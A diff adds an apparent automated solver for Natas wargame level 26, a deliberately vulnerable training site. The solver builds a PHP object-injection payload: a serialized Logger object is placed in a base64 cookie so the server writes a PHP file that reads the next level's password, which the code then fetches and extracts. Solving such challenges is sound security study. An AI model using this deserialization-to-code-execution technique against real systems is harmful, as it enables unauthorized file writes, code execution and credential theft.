@@ -720,4 +720,30 @@ end
 # Level 26
 class NatasLevel26 < NatasLevelBase
   LEVEL = 26
+  PAGE = '/'
+  PAYLOAD = %(<? echo(file_get_contents("#{WEBPASS}/natas27")); ?>)
+  LENGTH = 20
+  DICT =
+    ('a'..'z').to_a +
+    ('A'..'Z').to_a +
+    ('0'..'9').to_a
+
+  def exec
+    id = String.new
+    LENGTH.times { id << DICT.sample }
+    file = "img/#{id}.php"
+
+    payload = %(O:6:"Logger":3:{s:15:"\x00Logger\x00logFile";s:#{file.length}:"#{file}";s:15:"\x00Logger\x00initMsg";s:0:"";s:15:"\x00Logger\x00exitMsg";s:#{PAYLOAD.length}:"#{PAYLOAD}";})
+
+    get(PAGE, { 'Cookie' => "drawing=#{Base64.strict_encode64(payload)}" })
+    data = get("/#{file}").body
+    match = /(\w{32})\n/.match(data)
+    not_found unless match
+    found(match[1])
+  end
+end
+
+# Level 27
+class NatasLevel27 < NatasLevelBase
+  LEVEL = 27
 end
